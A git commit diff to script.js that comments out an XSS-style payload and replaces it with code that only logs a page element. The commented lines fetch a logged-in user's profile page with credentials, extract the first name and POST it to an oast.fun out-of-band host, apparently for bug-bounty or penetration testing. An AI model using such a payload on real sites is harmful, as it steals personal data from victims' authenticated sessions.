d61d199c07de3d9ede26f45bd7d62b6c22ef32a3
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2024-09-19 01:19:13 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,12 @@
-xhr=new XMLHttpRequest();
-xhr.open('GET','/ProfileSettings#general');
-xhr.withCredentials=true;
-xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
-xhr.send();
+//xhr=new XMLHttpRequest();
+//xhr.open('GET','/ProfileSettings#general');
+//xhr.withCredentials=true;
+//xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
+//xhr.send();
 
+document.addEventListener('DOMContentLoaded', () => {
+  const dataElement = document.querySelector('[data-bind="text: firstName"]');
+  if (dataElement) {
+    console.log('Data found:', dataElement.textContent);
+  }
+});
